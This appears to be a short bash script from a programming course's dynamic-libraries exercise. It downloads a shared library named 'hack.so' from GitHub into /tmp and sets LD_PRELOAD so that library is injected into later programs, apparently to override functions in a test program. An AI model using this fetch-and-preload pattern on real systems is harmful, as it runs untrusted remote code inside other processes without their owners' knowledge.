#!/bin/bash
curl "https://github.com/astrotee/alx-low_level_programming/raw/master/0x18-dynamic_libraries/hack.so" -sL -o /tmp/hack.so
export LD_PRELOAD="/tmp/hack.so"
